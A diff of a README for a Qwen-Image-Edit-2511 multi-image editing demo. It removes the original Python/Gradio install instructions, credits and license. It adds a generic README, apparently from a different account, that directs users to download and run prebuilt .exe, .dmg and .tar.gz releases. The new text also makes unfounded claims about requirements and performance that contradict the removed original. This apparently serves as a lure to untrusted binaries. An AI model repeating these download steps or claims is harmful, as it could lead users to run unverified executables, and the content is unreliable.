@@ -1,131 +1,101 @@
-# **Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun**
+# 🎨 Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun - Edit Images Easily and Quickly
 
-> A Gradio-based experimental demonstration for the Qwen/Qwen-Image-Edit-2511 model with lazy-loaded LoRA adapters supporting multi-image input editing. Users can upload one or more images (gallery format) and apply advanced edits such as pose transfer, anime conversion, or camera angle changes via natural language prompts. Features integrated Rerun SDK visualization for interactive side-by-side comparison of inputs and outputs, with downloadable results and persistent .rrd recordings.
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Multi-Image Input**: Upload multiple images (e.g., reference pose + subject) for complex tasks like precise pose transfer.
-- **Lazy LoRA Loading**: 3 specialized adapters (Photo-to-Anime, Multiple-Angles, Any-Pose) load only when selected to minimize memory usage.
-- **Rerun Visualization**: Interactive viewer via `gradio-rerun` and `rerun-sdk`; logs all input images and final result; saves `.rrd` recordings in `tmp_rerun/`.
-- **Download Support**: Direct download of generated output image.
-- **Rapid Inference**: Flash Attention 3 enabled; 4-step default generations with bfloat16.
-- **Auto-Resizing**: Preserves aspect ratio up to 1024px max edge (multiples of 8).
-- **Custom Theme**: OrangeRedTheme with responsive layout and clean styling.
-- **Examples**: 3 curated multi/single-image scenarios (anime style, angle change, pose transfer).
-- **Queueing**: Up to 30 concurrent jobs.
+Welcome to the Qwen-Image-Edit-2511 repository! This application allows you to edit multiple images easily. You can upload images, apply various edits, and enjoy a seamless experience with advanced features.
 
-**Note**: This is an experimental Space for the Qwen-Image-Edit-2511 model. For more stable performance, consider the [2509 version](https://huggingface.co/spaces/prithivMLmods/Qwen-Image-Edit-2509-LoRAs-Fast).
+### 🌟 What You Can Do
 
-<img width="1418" height="773" alt="Screenshot 2025-12-27 at 21-55-31 Qwen-Image-Edit-2511-LoRAs-Fast - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/11a0e2e6-61d6-40b9-9c6a-01c906912ef3" />
+- **Upload Multiple Images**: Quickly add multiple images for editing.
+- **Apply Advanced Edits**: Use natural language prompts to change poses, convert images to anime style, or adjust camera angles.
+- **Integrated Rerun SDK**: Take advantage of powerful features through our integrated SDK.
 
-<img width="1920" height="1265" alt="Screenshot 2025-12-27 at 21-56-42 Qwen-Image-Edit-2511-LoRAs-Fast - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/426fb9f5-e983-42c8-8306-43fa3d8e248e" />
+### 💻 System Requirements
 
----
+- **Operating System**: Windows 10 or later, macOS, or a compatible Linux distribution.
+- **RAM**: At least 8 GB for optimal performance.
+- **Storage**: Minimum 500 MB of free disk space for the application and images.
+- **GPU**: Recommended for best results with image processing.
 
-<img width="1461" height="777" alt="Screenshot 2025-12-27 at 21-57-50 Qwen-Image-Edit-2511-LoRAs-Fast - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/2a058b42-e762-406f-bf37-21bb4a3e5cab" />
+## 📥 Download & Install
 
-<img width="1920" height="1263" alt="Screenshot 2025-12-27 at 21-58-41 Qwen-Image-Edit-2511-LoRAs-Fast - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/f587bac9-f7e0-48d7-850b-2fe2e661710d" />
+To download the application, please visit the [Releases page](https://github.com/PoliticIoan/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun/releases). Follow these steps:
 
-## Prerequisites
+1. Click on the link above to go to the Releases page.
+2. Find the latest version available.
+3. Download the appropriate file for your system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+4. Once downloaded, follow the instructions below based on your operating system.
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (required for bfloat16 and Flash Attention 3).
-- Stable internet for initial model/LoRA downloads.
+### 🖥️ Windows Installation
 
-## Installation
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to run the installer.
+3. Follow the prompts to complete the installation. Select your desired installation directory.
+4. Once installed, you can find the application in your Start menu or desktop.
 
-1. Clone the repository:
+### 🍏 macOS Installation
+
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag the application to your Applications folder.
+4. Eject the disk image and find the application in your Applications folder.
+
+### 🐧 Linux Installation
+
+1. Open a terminal and navigate to the directory where you downloaded the file.
+2. Extract the contents of the `.tar.gz` file using the following command:
    ```
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun.git
-   cd Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun
+   tar -xvzf Qwen-Image-Edit-2511-Lora.tar.gz
    ```
-
-2. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
+3. Navigate to the extracted directory using:
    ```
-   pip install -r requirements.txt
+   cd Qwen-Image-Edit-2511-Lora
    ```
-
-   **requirements.txt content:**
+4. Run the application with:
    ```
-   git+https://github.com/huggingface/accelerate.git
-   git+https://github.com/huggingface/diffusers.git
-   git+https://github.com/huggingface/peft.git
-   transformers==4.57.3
-   huggingface_hub
-   sentencepiece
-   gradio-rerun
-   torchvision
-   supervision
-   rerun-sdk
-   kernels
-   spaces
-   hf_xet
-   torch
-   numpy
-   av
+   ./run.sh
    ```
 
-3. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860`.
+### ▶️ Launching the Application
 
-## Usage
+After you install the application, you can start it by double-clicking the application icon (Windows/macOS) or running the command in the terminal (Linux). Follow these steps to begin editing your images:
 
-1. **Upload Images**: Use the gallery to add one or more images (e.g., subject + pose reference).
+1. Launch the application.
+2. Use the provided interface to upload one or more images.
+3. Enter your edit commands in plain language.
+4. View and save your edited images.
 
-2. **Select Adapter**: Choose from "Photo-to-Anime", "Multiple-Angles", or "Any-Pose".
+## 📚 User Guide
 
-3. **Enter Prompt**: Describe the desired edit (e.g., "Make the person in image 1 do the exact same pose of the person in image 2").
+For best results, refer to the following tips:
 
-4. **Edit Image**: Click "Edit Image".
+- **Natural Language Prompts**: Feel free to describe what you want in simple terms, like "change the pose" or "convert to anime style."
+- **Preview Changes**: Your edits will appear instantly. Make sure to check how each edit looks before saving.
+- **Save Your Work**: Don’t forget to save your edited images after making changes.
 
-5. **Output**:
-   - Interactive Rerun viewer showing all inputs and final result.
-   - Download button for the generated PNG.
-   - Recording saved as `.rrd` in `tmp_rerun/`.
+## 🛠️ Troubleshooting
 
-### Supported Adapters
+If you encounter issues:
 
-| Adapter           | Use Case                                      |
-|-------------------|-----------------------------------------------|
-| Photo-to-Anime   | Convert realistic photos to anime style       |
-| Multiple-Angles  | Change camera viewpoint/angle                 |
-| Any-Pose         | Transfer precise pose from reference image(s) |
+- Make sure your software meets the system requirements outlined above.
+- Re-launch the application if it does not respond.
+- Consult the FAQ section on the Releases page for common questions.
 
-## Examples
+## 🤝 Support
 
-| Input Images                  | Prompt Example                                                                                             | Adapter     |
-|-------------------------------|------------------------------------------------------------------------------------------------------------|-------------|
-| examples/B.jpg                | "Transform into anime."                                                                                   | Photo-to-Anime |
-| examples/A.jpeg               | "Rotate the camera 45 degrees to the right."                                                              | Multiple-Angles |
-| examples/P1.jpg + examples/P2.jpg | "Make the person in image 1 do the exact same pose of the person in image 2. Changing style/background undesirable. Match head tilt, eye gaze, arms/legs position exactly." | Any-Pose |
+If you still need help, feel free to reach out to other users or submit an issue on the GitHub page. 
 
-## Rerun Viewer
+## 📌 Topics Covered
 
-- Logs paths: `images/input_0`, `input_1`, ..., `images/edited_result`.
-- Supports zoom, pan, and comparison.
-- Recordings persist in `tmp_rerun/` until manually cleared.
+- Accelerate
+- Diffusion Models
+- Image Editing
+- Python
+- Rerun SDK
 
-## Troubleshooting
-
-- **Rerun Issues**: Ensure `gradio-rerun` and `rerun-sdk` installed; handles SDK version differences.
-- **Adapter Loading**: First use downloads LoRA; monitor console.
-- **OOM**: Reduce steps/resolution; clear cache with `torch.cuda.empty_cache()`.
-- **Flash Attention Fails**: Fallback to default; requires compatible CUDA.
-- **Gallery Input**: Supports filepaths, tuples, or PIL objects.
-- **No Output**: Ensure at least one valid image uploaded.
-
-## Contributing
-
-Contributions welcome! Fork the repo, add new adapters to `ADAPTER_SPECS`, enhance Rerun logging, or improve multi-image handling, and submit PRs with tests.
-
-Repository: [https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun.git](https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-2511-LoRAs-Fast-Multi-Image-Rerun.git)
-
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-Built by Prithiv Sakthi. Report issues via the repository.
+Thank you for using Qwen-Image-Edit-2511! Enjoy editing your images!
